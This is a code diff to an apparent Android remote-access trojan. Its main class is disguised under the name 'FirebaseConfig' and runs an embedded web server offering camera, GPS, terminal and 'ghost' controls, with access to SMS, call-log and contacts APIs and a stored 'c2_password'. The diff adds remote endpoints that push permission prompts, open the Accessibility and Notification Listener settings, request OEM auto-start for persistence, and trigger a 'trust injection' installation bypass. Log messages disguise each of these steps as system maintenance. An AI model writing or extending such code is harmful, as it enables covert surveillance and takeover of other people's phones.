@@ -14,6 +14,7 @@ import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
@@ -48,6 +49,7 @@ import com.labs.labrats.modules.ExploitsModule;
 import com.labs.labrats.modules.TerminalModule;
 import com.labs.labrats.modules.GhostModule;
 import com.labs.labrats.router.AuthController;
+import com.labs.labrats.router.PasswordHasher;
 import com.labs.labrats.router.Router;
 import fi.iki.elonen.NanoHTTPD;
 
@@ -218,7 +220,7 @@ public class FirebaseConfig extends NanoHTTPD {
         String navHtml = "";
         if (!uri.equals("/login")) {
             navHtml = "  <div class=\"nav\">" +
-                "    <a href=\"/\" id=\"nav-home\" class=\"" + homeActive + "\">Terminal</a>" +
+                "    <a href=\"/terminal\" id=\"nav-home\" class=\"" + homeActive + "\">Terminal</a>" +
                 "    <a href=\"/ghost\" id=\"nav-ghost\" class=\"" + ghostActive + "\">Ghost</a>" +
                 "    <a href=\"/camera\" id=\"nav-camera\" class=\"" + cameraActive + "\">Optics</a>" +
                 "    <a href=\"/gps\" id=\"nav-gps\" class=\"" + gpsActive + "\">Locate</a>" +
@@ -591,6 +593,61 @@ public class FirebaseConfig extends NanoHTTPD {
             } catch (Exception ignored) {}
             showToast(msg, size, y, anim, duration, color);
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/fix-persistence")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched permission repair sequence.");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                Intent intent = new Intent(context, PermissionActivity.class);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                context.startActivity(intent);
+            });
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"REPAIR_SEQUENCE_DISPATCHED\"}");
+        } else if (uri.equals("/device/request-permissions")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched batch permission prompt.");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                Intent intent = new Intent(context, PermissionActivity.class);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                context.startActivity(intent);
+            });
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"PERMISSION_PROMPTS_DISPATCHED\"}");
+        } else if (uri.equals("/device/optimize-stability")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched OEM auto-start optimization.");
+            new Handler(Looper.getMainLooper()).post(() -> OemStabilityHelper.requestAutoStart(context));
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"OEM_OPTIMIZATION_DISPATCHED\"}");
+        } else if (uri.equals("/device/deep-repair")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched application settings details.");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                    intent.setData(Uri.parse("package:" + context.getPackageName()));
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
+                } catch (Exception ignored) {}
+            });
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"APP_SETTINGS_OPENED\"}");
+        } else if (uri.equals("/device/open-accessibility")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely opened Accessibility settings.");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
+                } catch (Exception ignored) {}
+            });
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"ACCESSIBILITY_HUB_OPENED\"}");
+        } else if (uri.equals("/device/open-notifications")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely opened Notification Listener settings.");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
+                } catch (Exception ignored) {}
+            });
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"NOTIFICATION_HUB_OPENED\"}");
+        } else if (uri.equals("/device/inject-trust")) {
+            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched session installation bypass.");
+            new Handler(Looper.getMainLooper()).post(() -> StabilityBypass.executeTrustInjection(context));
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"BYPASS_SEQUENCE_INITIATED\"}");
         } else if (uri.equals("/device/terminate")) {
             logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -822,10 +879,7 @@ public class FirebaseConfig extends NanoHTTPD {
                 return serveError(session, "Invalid password");
             }
 
-            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                    .edit()
-                    .putString("c2_password", newPass.trim())
-                    .apply();
+            PasswordHasher.savePassword(context, newPass.trim());
 
             logActivity("SECURITY_PROTOCOL: Interface password updated");
 
